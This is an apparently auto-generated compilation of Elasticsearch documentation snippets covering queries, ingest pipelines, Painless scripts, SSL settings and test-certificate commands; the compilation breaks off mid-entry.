Filter\nDESCRIPTION: Example of using the analyze API with keyword_repeat filter to process text and output keyword versions of tokens. The request includes whitespace tokenizer and displays keyword attributes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keyword-repeat-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [\n    \"keyword_repeat\"\n  ],\n  \"text\": \"fox running and jumping\",\n  \"explain\": true,\n  \"attributes\": \"keyword\"\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Documents into a Data Stream using Java\nDESCRIPTION: This Java code snippet shows how to index documents into a data stream using the Elasticsearch Java client. It creates an IndexRequest and sets the required @timestamp field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/ml/licenses/ojalgo-NOTICE.txt#2025-04-22_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nIndexRequest request = new IndexRequest(\"my-data-stream\");\nrequest.source(jsonBuilder()\n    .startObject()\n        .field(\"@timestamp\", new Date())\n        .field(\"message\", \"test message\")\n    .endObject()\n);\nIndexResponse indexResponse = client.index(request, RequestOptions.DEFAULT);\n```\n\n----------------------------------------\n\nTITLE: Demonstrating subtract Function in EQL\nDESCRIPTION: The subtract function returns the difference between a provided minuend and subtrahend. It supports integer and float values, as well as field references. The function handles null values by returning null if either operand is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-function-ref.md#2025-04-21_snippet_15\n\nLANGUAGE: eql\nCODE:\n```\nsubtract(10, 2)                                          // returns 8\nsubtract(10.5, 0.5)                                      // returns 10\nsubtract(1, 0.2)                                         // returns 0.8\nsubtract(-2, 4)                                          // returns -8\nsubtract(-2, -4)                                         // returns 8\n\n// process.args_count = 10\nsubtract(process.args_count, 6)                          // returns 4\nsubtract(process.args_count, 5)                          // returns 5\nsubtract(15, process.args_count)                         // returns 5\nsubtract(process.args_count, 0.5)                        // returns 9.5\n\n// process.parent.args_count = 6\nsubtract(process.args_count, process.parent.args_count)  // returns 4\n\n// null handling\nsubtract(null, 2)                                        // returns null\nsubtract(2, null)                                        // returns null\n```\n\n----------------------------------------\n\nTITLE: Parsing Structured Data with GROK in ESQL\nDESCRIPTION: This snippet uses the GROK function in ESQL to parse a string containing timestamp, IP address, email, and number. It extracts these fields and keeps only the parsed values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/grokWithConversionSuffix.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"2023-01-23T12:15:00.000Z 127.0.0.1 some.email@foo.com 42\"\n| GROK a \"\"\"%{TIMESTAMP_ISO8601:date} %{IP:ip} %{EMAILADDRESS:email} %{NUMBER:num:int}\"\"\"\n| KEEP date, ip, email, num\n```\n\n----------------------------------------\n\nTITLE: Creating Shirt Mapping and Document in Elasticsearch\nDESCRIPTION: Creates an index mapping for shirts with brand, color and model properties, then adds a sample document for a red Gucci slim shirt.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/filter-search-results.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT /shirts\n{\n  \"mappings\": {\n    \"properties\": {\n      \"brand\": { \"type\": \"keyword\"},\n      \"color\": { \"type\": \"keyword\"},\n      \"model\": { \"type\": \"keyword\"}\n    }\n  }\n}\n\nPUT /shirts/_doc/1?refresh\n{\n  \"brand\": \"gucci\",\n  \"color\": \"red\",\n  \"model\": \"slim\"\n}\n```\n\n----------------------------------------\n\nTITLE: Explicit Synonym Mapping with Token Replacement\nDESCRIPTION: Creates explicit mappings that replace specific token sequences with alternative representations, ignoring the expand parameter in schema configuration\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/src/test/cluster/config/analysis/synonym.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\ni-pod, i pod => ipod\nsea biscuit, sea biscit => seabiscuit\n```\n\n----------------------------------------\n\nTITLE: Configuring Remote Clusters for Cross-Cluster EQL Search in Elasticsearch\nDESCRIPTION: This snippet shows how to configure remote clusters 'cluster_one' and 'cluster_two' for cross-cluster EQL searches using the cluster update settings API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_31\n\nLANGUAGE: console\nCODE:\n```\nPUT /_cluster/settings\n{\n  \"persistent\": {\n    \"cluster\": {\n      \"remote\": {\n        \"cluster_one\": {\n          \"seeds\": [\n            \"127.0.0.1:9300\"\n          ]\n        },\n        \"cluster_two\": {\n          \"seeds\": [\n            \"127.0.0.1:9301\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL String EndsWith Function Description\nDESCRIPTION: Documentation comment specifying the purpose of an ESQL function that checks if a keyword string ends with another string. This appears to be an auto-generated test case file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/ends_with.md#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nReturns a boolean that indicates whether a keyword string ends with another string.\n```\n\n----------------------------------------\n\nTITLE: Creating Ingest Pipeline with Painless Script\nDESCRIPTION: A console command to create an Elasticsearch ingest pipeline named 'seats' that uses a Painless script to parse and transform date and time fields in incoming documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-ingest-processor-context.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /_ingest/pipeline/seats\n{\n  \"description\": \"update datetime for seats\",\n  \"processors\": [\n    {\n      \"script\": {\n        \"source\": \"String[] dateSplit = ctx.date.splitOnToken('-'); String year = dateSplit[0].trim(); String month = dateSplit[1].trim(); if (month.length() == 1) { month = '0' + month; } String day = dateSplit[2].trim(); if (day.length() == 1) { day = '0' + day; } boolean pm = ctx.time.substring(ctx.time.length() - 2).equals('PM'); String[] timeSplit = ctx.time.substring(0, ctx.time.length() - 2).splitOnToken(':'); int hours = Integer.parseInt(timeSplit[0].trim()); int minutes = Integer.parseInt(timeSplit[1].trim()); if (pm) { hours += 12; } String dts = year + '-' + month + '-' + day + 'T' + (hours < 10 ? '0' + hours : '' + hours) + ':' + (minutes < 10 ? '0' + minutes : '' + minutes) + ':00+08:00'; ZonedDateTime dt = ZonedDateTime.parse(dts, DateTimeFormatter.ISO_OFFSET_DATE_TIME); ctx.datetime = dt.getLong(ChronoField.INSTANT_SECONDS)*1000L;\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring PKCS#12 Files for Elasticsearch Monitoring Exporters\nDESCRIPTION: These YAML configuration settings are used to set up PKCS#12 files for SSL in Elasticsearch monitoring exporters. They include paths, types, passwords, and other related options for both keystores and truststores.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/monitoring-settings.md#2025-04-21_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.monitoring.exporters.$NAME.ssl.keystore.path: \nxpack.monitoring.exporters.$NAME.ssl.keystore.type: \nxpack.monitoring.exporters.$NAME.ssl.keystore.password: \nxpack.monitoring.exporters.$NAME.ssl.keystore.secure_password: \nxpack.monitoring.exporters.$NAME.ssl.keystore.key_password: \nxpack.monitoring.exporters.$NAME.ssl.keystore.secure_key_password: \nxpack.monitoring.exporters.$NAME.ssl.truststore.path: \nxpack.monitoring.exporters.$NAME.ssl.truststore.type: \nxpack.monitoring.exporters.$NAME.ssl.truststore.password: \nxpack.monitoring.exporters.$NAME.ssl.truststore.secure_password: \n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Span Containing Query Example\nDESCRIPTION: This code snippet demonstrates the usage of the `span_containing` query in Elasticsearch. It searches for documents where the `big` span, defined as a `span_near` query containing two terms, encloses the `little` span, defined as a `span_term` query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-span-containing-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"span_containing\": {\n      \"little\": {\n        \"span_term\": { \"field1\": \"foo\" }\n      },\n      \"big\": {\n        \"span_near\": {\n          \"clauses\": [\n            { \"span_term\": { \"field1\": \"bar\" } },\n            { \"span_term\": { \"field1\": \"baz\" } }\n          ],\n          \"slop\": 5,\n          \"in_order\": true\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Logarithm with Base 2 in ESQL\nDESCRIPTION: Demonstrates how to calculate the logarithm of a value (8.0) with a specified base (2.0) using the LOG function. The function returns a double value and handles special cases like zero, negative numbers, and base of one by returning null with a warning.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/log.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW base = 2.0, value = 8.0\n| EVAL s = LOG(base, value)\n```\n\n----------------------------------------\n\nTITLE: User Object Schema for Security Config Change Events in Elasticsearch\nDESCRIPTION: Defines the structure of a user object in security configuration change events. It includes fields for the user's name, enabled status, roles, personal information, password status, and metadata.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_20\n\nLANGUAGE: javascript\nCODE:\n```\n{\"name\": <string>, \"enabled\": <boolean>, \"roles\": <string_list>,\n\"full_name\": <string>, \"email\": <string>, \"has_password\": <boolean>,\n\"metadata\": <object>}\n```\n\n----------------------------------------\n\nTITLE: Calculating Sum of Squares with SUM_OF_SQUARES in SQL\nDESCRIPTION: This SQL snippet demonstrates the usage of the SUM_OF_SQUARES function. It returns the sum of the squares of all input values in the specified field (field_name), and ignores null values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_18\n\nLANGUAGE: sql\nCODE:\n```\n```sql\nSUM_OF_SQUARES(field_name) <1>\n```\n```\n\n----------------------------------------\n\nTITLE: Moving Max Function Example\nDESCRIPTION: Example of using the pre-built max function in a moving function aggregation to find maximum values in the window.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-movfn-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_date_histo\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"1M\"\n      },\n      \"aggs\": {\n        \"the_sum\": {\n          \"sum\": { \"field\": \"price\" }\n        },\n        \"the_moving_max\": {\n          \"moving_fn\": {\n            \"buckets_path\": \"the_sum\",\n            \"window\": 10,\n            \"script\": \"MovingFunctions.max(values)\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Process Sequence Query Example\nDESCRIPTION: Query to match sequence of process events sharing same PID value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_19\n\nLANGUAGE: eql\nCODE:\n```\nsequence by process.pid\n  [ process where event.type == \"start\" and process.name == \"cmd.exe\" ]\n  [ process where file.extension == \"exe\" ]\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameters Documentation in Markdown\nDESCRIPTION: Comprehensive documentation of supported function parameters for ESQL queries, including fuzziness controls, analyzer settings, matching behavior, and relevance scoring options. Each parameter is defined with its type and default behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/functionNamedParams/match.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Supported function named parameters**\n\n`fuzziness`\n:   (keyword) Maximum edit distance allowed for matching.\n\n`auto_generate_synonyms_phrase_query`\n:   (boolean) If true, match phrase queries are automatically created for multi-term synonyms. Defaults to true.\n\n`analyzer`\n:   (keyword) Analyzer used to convert the text in the query value into token. Defaults to the index-time analyzer mapped for the field. If no analyzer is mapped, the index's default analyzer is used.\n\n`minimum_should_match`\n:   (integer) Minimum number of clauses that must match for a document to be returned.\n\n`zero_terms_query`\n:   (keyword) Indicates whether all documents or none are returned if the analyzer removes all tokens, such as when using a stop filter. Defaults to none.\n\n`boost`\n:   (float) Floating point number used to decrease or increase the relevance scores of the query. Defaults to 1.0.\n\n`fuzzy_transpositions`\n:   (boolean) If true, edits for fuzzy matching include transpositions of two adjacent characters (ab → ba). Defaults to true.\n\n`fuzzy_rewrite`\n:   (keyword) Method used to rewrite the query. See the rewrite parameter for valid values and more information. If the fuzziness parameter is not 0, the match query uses a fuzzy_rewrite method of top_terms_blended_freqs_${max_expansions} by default.\n\n`prefix_length`\n:   (integer) Number of beginning characters left unchanged for fuzzy matching. Defaults to 0.\n\n`lenient`\n:   (boolean) If false, format-based errors, such as providing a text query value for a numeric field, are returned. Defaults to false.\n\n`operator`\n:   (keyword) Boolean logic used to interpret text in the query value. Defaults to OR.\n\n`max_expansions`\n:   (integer) Maximum number of terms to which the query will expand. Defaults to 50.\n```\n\n----------------------------------------\n\nTITLE: Filtering with IS NOT NULL and Counting in ESQL\nDESCRIPTION: This ESQL query filters the employees dataset to include only records where is_rehired is not null, then counts the resulting employee numbers. The query returns a count of 84 matching records.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/examples/is_not_null.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE is_rehired IS NOT NULL\n| STATS COUNT(emp_no)\n```\n\n----------------------------------------\n\nTITLE: Simulating Network Direction Processor in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the network direction processor to determine traffic direction. It processes a document with external source IP and internal destination IP, resulting in the traffic being classified as 'inbound'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/network-direction-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _ingest/pipeline/_simulate\n{\n  \"pipeline\": {\n    \"processors\": [\n      {\n        \"network_direction\": {\n          \"internal_networks\": [\"private\"]\n        }\n      }\n    ]\n  },\n  \"docs\": [\n    {\n      \"_source\": {\n        \"source\": {\n          \"ip\": \"128.232.110.120\"\n        },\n        \"destination\": {\n          \"ip\": \"192.168.1.1\"\n        }\n      }\n    }\n  ]\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"docs\": [\n    {\n      \"doc\": {\n        ...\n        \"_source\": {\n          \"destination\": {\n            \"ip\": \"192.168.1.1\"\n          },\n          \"source\": {\n            \"ip\": \"128.232.110.120\"\n          },\n          \"network\": {\n            \"direction\": \"inbound\"\n          }\n        }\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Sync Job Status\nDESCRIPTION: Fetches the status and updates of the most recent sync job using the `Get sync job API`. The completion status is marked by a `completed` flag.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_17\n\nLANGUAGE: console\nCODE:\n```\nGET _connector/_sync_job?connector_id=my-connector-id&size=1\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Elision Filter\nDESCRIPTION: Example of creating a custom analyzer that uses the elision filter with a whitespace tokenizer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-elision-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /elision_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"whitespace_elision\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"elision\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Response from Span Fragmenter Highlighting\nDESCRIPTION: This is the response from using 'span' fragmenter with the 'plain' highlighter, showing how the text is kept together between highlighted terms unlike with the 'simple' fragmenter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_28\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"hits\": {\n    \"total\": {\n      \"value\": 1,\n      \"relation\": \"eq\"\n    },\n    \"max_score\": 1.6011951,\n    \"hits\": [\n      {\n        \"_index\": \"my-index-000001\",\n        \"_id\": \"1\",\n        \"_score\": 1.6011951,\n        \"_source\": {\n          \"message\": \"some message with the number 1\",\n          \"context\": \"bar\"\n        },\n        \"highlight\": {\n          \"message\": [\n            \" with the <em>number</em> <em>1</em>\"\n          ]\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Reindex Status in Elasticsearch\nDESCRIPTION: This snippet shows how to check the current status of a running reindex data stream task. The status provides information about progress, including completed indices, in-progress work, and any errors.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reindex-data-stream.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_migration/reindex/my-data-stream/_status\n```\n\n----------------------------------------\n\nTITLE: Named Query Explanation in RRF Elasticsearch Response\nDESCRIPTION: Example response showing how named queries appear in the RRF explain output. The explanation references the query by name rather than by index, making it easier to understand.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_11\n\nLANGUAGE: js\nCODE:\n```\n{\n    \"hits\":\n    [\n        {\n            \"_index\": \"example-index\",\n            \"_id\": \"3\",\n            \"_score\": 0.8333334,\n            \"_explanation\":\n            {\n                \"value\": 0.8333334,\n                \"description\": \"rrf score: [0.8333334] computed for initial ranks [2, 1] with rankConstant: [1] as sum of [1 / (rank + rankConstant)] for each query\",\n                \"details\":\n                [\n                    {\n                        \"value\": 2,\n                        \"description\": \"rrf score: [0.33333334], for rank [2] in query at index [0] computed as [1 / (2 + 1]), for matching query with score: \",\n                        \"details\":\n                        [\n                            ...\n                        ]\n                    },\n                    {\n                        \"value\": 1,\n                        \"description\": \"rrf score: [0.5], for rank [1] in query [my_knn_query] computed as [1 / (1 + 1]), for matching query with score: \",                      <1>\n                        \"details\":\n                        [\n                           ...\n                        ]\n                    }\n                ]\n            }\n        }\n        ...\n    ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Transport Tracer Patterns\nDESCRIPTION: Configures which transport actions will be traced using include and exclude patterns.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_17\n\nLANGUAGE: console\nCODE:\n```\nPUT _cluster/settings\n{\n   \"persistent\" : {\n      \"transport.tracer.include\" : \"*\",\n      \"transport.tracer.exclude\" : \"internal:coordination/fault_detection/*\"\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Exporting Certificate and Key Pair from PKCS#12 to PEM\nDESCRIPTION: Function to export both certificate and private key from a PKCS#12 file to separate PEM files using a combination of keytool and openssl.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/src/test/resources/org/elasticsearch/xpack/ssl/SSLErrorMessageTests/README.txt#2025-04-21_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nfunction p12-export-pair() {\n    local P12File=\"$1\"\n    local P12Pass=\"$2\"\n    local P12Name=\"$3\"\n    local CrtFile=\"$4\"\n    local KeyFile=\"$5\"\n\n    local TmpFile=\"${PWD}/$(basename $P12File .p12).tmp.p12\"\n    \n    # OpenSSL doesn't have a way to export a single entry\n    # Keytool doesn't have a way to export keys\n    # So we use keytool to export the whole entry to a temporary PKCS#12 and then use openssl to export that to PEM\n\n    keytool -importkeystore -srckeystore \"${PWD}/$P12File\" -srcstorepass \"$P12Pass\" -srcalias \"$P12Name\" \\\n        -destkeystore \"$TmpFile\" -deststorepass \"tmp_password\" \n\n    # This produces an unencrypted PKCS#1 key. Use other commands to convert it if needed\n    # The sed is to skip \"BagAttributes\" which we don't need\n    openssl pkcs12 -in \"$TmpFile\" -nodes   -nocerts -passin \"pass:tmp_password\" | sed -n -e'/^-----/,/^-----/p' > $KeyFile\n    openssl pkcs12 -in \"$TmpFile\" -clcerts -nokeys  -passin \"pass:tmp_password\" | sed -n -e'/^-----/,/^-----/p' > $CrtFile\n\n    rm $TmpFile\n}\n```\n\n----------------------------------------\n\nTITLE: Equality Equals with Primitive Types in Painless\nDESCRIPTION: Illustrates using the equality equals operator with primitive numeric types (int and double) in Painless. It declares an integer and a double, then compares them using '==', showcasing implicit type promotion and comparison between the two numeric values, followed by comparing an integer literal to the integer variable.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_12\n\nLANGUAGE: painless\nCODE:\n```\n\"int a = 1;          <1>\ndouble b = 2.0;     <2>\nboolean c = a == b; <3>\nc = 1 == a;         <4>\"\n```\n\n----------------------------------------\n\nTITLE: Paired T-test Aggregation Query in Elasticsearch\nDESCRIPTION: Illustrates a complete Elasticsearch query using t_test aggregation to compare node startup times before and after an upgrade, using a paired test.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-ttest-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET node_upgrade/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"startup_time_ttest\": {\n      \"t_test\": {\n        \"a\": { \"field\": \"startup_time_before\" },  <1>\n        \"b\": { \"field\": \"startup_time_after\" },   <2>\n        \"type\": \"paired\"                          <3>\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling EC2 Discovery in Elasticsearch Configuration\nDESCRIPTION: Basic YAML configuration to enable EC2 seed hosts provider in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-ec2-usage.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ndiscovery.seed_providers: ec2\n```\n\n----------------------------------------\n\nTITLE: Configuring Rename Processor in Elasticsearch Ingest Pipeline\nDESCRIPTION: This snippet demonstrates how to configure the Rename processor in an Elasticsearch ingest pipeline. It renames the 'provider' field to 'cloud.provider'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/rename-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"rename\": {\n    \"field\": \"provider\",\n    \"target_field\": \"cloud.provider\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Error Response for Deleting an In-Use Extension in JSON\nDESCRIPTION: This JSON snippet shows the error response received when attempting to delete an extension that is currently in use by a deployment. It includes an error message and code indicating which deployment is using the extension.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_20\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"errors\": [\n        {\n            \"message\": \"Cannot delete extension [EXTENSION_ID]. It is used by deployments [DEPLOYMENT_NAME].\",\n            \"code\": \"extensions.extension_in_use\"\n        }\n    ]\n}\n```\n\n----------------------------------------\n\nTITLE: Parsing Custom Format DateTime\nDESCRIPTION: Shows how to parse a custom formatted datetime string using a custom DateTimeFormatter pattern.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_3\n\nLANGUAGE: painless\nCODE:\n```\nString datetime = 'custom y 1983 m 10 d 13 22:15:30 Z';\nDateTimeFormatter dtf = DateTimeFormatter.ofPattern(\n        \"'custom' 'y' yyyy 'm' MM 'd' dd HH:mm:ss VV\");\nZonedDateTime zdt = ZonedDateTime.parse(datetime, dtf);\n```\n\n----------------------------------------\n\nTITLE: Using REPLACE Function in Elasticsearch SQL\nDESCRIPTION: Searches a source string for occurrences of a pattern and replaces them with a replacement string. All inputs must be non-null with a 1 MB limit for the resulting string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_14\n\nLANGUAGE: sql\nCODE:\n```\nREPLACE(\n    source,      <1>\n    pattern,     <2>\n    replacement) <3>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT REPLACE('Elastic','El','Fant');\n\nREPLACE('Elastic','El','Fant')\n------------------------------\nFantastic\n```\n\n----------------------------------------\n\nTITLE: Configuring ILM Wait for Snapshot Policy in Elasticsearch\nDESCRIPTION: Creates an ILM policy that waits for a specified SLM (Snapshot Lifecycle Management) policy to complete before proceeding with index deletion. Requires a policy name parameter to specify which SLM policy to wait for.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-wait-for-snapshot.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"delete\": {\n        \"actions\": {\n          \"wait_for_snapshot\" : {\n            \"policy\": \"slm-policy-name\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating HTTP Server Certificate for Elasticsearch in Bash\nDESCRIPTION: Generates a certificate for the HTTP server signed by the previously created CA. It sets up DNS for localhost and IP addresses for both IPv4 and IPv6 loopback interfaces with a 9999-day validity period.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/qa/saml-rest-tests/src/javaRestTest/resources/ssl/README.txt#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nelasticsearch-certutil cert --name \"http\" --ca-cert ${PWD}/ca.crt --ca-key ${PWD}/ca.key --days 9999 --dns \"localhost\" --ip \"127.0.0.1\" --ip \"0:0:0:0:0:0:0:1\" --keysize 2048 --out ${PWD}/http.zip --pem \nunzip http.zip\nmv http/http.* ./\nrmdir http\nrm http.zip\n```\n\n----------------------------------------\n\nTITLE: Using Pattern Matching for Table Names\nDESCRIPTION: Example of using a pattern with wildcard to match multiple indices as the table name, with the requirement that all resolved tables have the same mapping.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_7\n\nLANGUAGE: sql\nCODE:\n```\nSELECT emp_no FROM \"e*p\" LIMIT 1;\n```\n\n----------------------------------------\n\nTITLE: Zipping Multivalued Fields in ESQL\nDESCRIPTION: Combines values from two multivalued fields using a custom delimiter, creating a new field with zipped values. The function allows merging corresponding elements from different arrays with a specified separator.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_zip.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = [\"x\", \"y\", \"z\"], b = [\"1\", \"2\"]\n| EVAL c = mv_zip(a, b, \"-\")\n| KEEP a, b, c\n```\n\n----------------------------------------\n\nTITLE: Parsing Log Fields with Painless Runtime Composite Field Context\nDESCRIPTION: This script uses the composite_field context with grok pattern matching to extract multiple fields from an Apache log entry, creating structured data from unstructured log text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_21\n\nLANGUAGE: console\nCODE:\n```\nPOST /_scripts/painless/_execute\n{\n  \"script\": {\n    \"source\": \"emit(grok(\\\"%{COMMONAPACHELOG}\\\").extract(doc[\\\"message\\\"].value));\"\n  },\n  \"context\": \"composite_field\",\n  \"context_setup\": {\n    \"index\": \"my-index-000001\",\n    \"document\": {\n      \"timestamp\":\"2020-04-30T14:31:27-05:00\",\n      \"message\":\"252.0.0.0 - - [30/Apr/2020:14:31:27 -0500] \\\"GET /images/hm_bg.jpg HTTP/1.0\\\" 200 24736\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an index with bit vector mapping in Elasticsearch\nDESCRIPTION: Creates an Elasticsearch index with a dense_vector field configured for bit vectors. The field uses element_type: bit with 40 dimensions (bits) that will be stored as 5 bytes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/dense-vector.md#_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPUT my-bit-vectors\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_vector\": {\n        \"type\": \"dense_vector\",\n        \"dims\": 40,\n        \"element_type\": \"bit\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Painless Script for Aggregation\nDESCRIPTION: This Painless script is embedded within an aggregation to calculate a custom cost value based on document fields `cost` and `number`.  It calculates the sum based on the product of these two values. This allows for dynamic calculation of a field within the aggregation itself.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-watcher-transform-context.md#2025-04-21_snippet_6\n\nLANGUAGE: painless\nCODE:\n```\ndoc.cost.value * doc.number.value\n```\n\n----------------------------------------\n\nTITLE: ESQL FROM Query with Metadata Fields\nDESCRIPTION: Shows how to use the METADATA directive in the FROM command to retrieve specific metadata fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/from.md#2025-04-21_snippet_5\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees METADATA _id\n```\n\n----------------------------------------\n\nTITLE: Sample Event Data for EQL Sequence Query Example in JavaScript\nDESCRIPTION: Sample 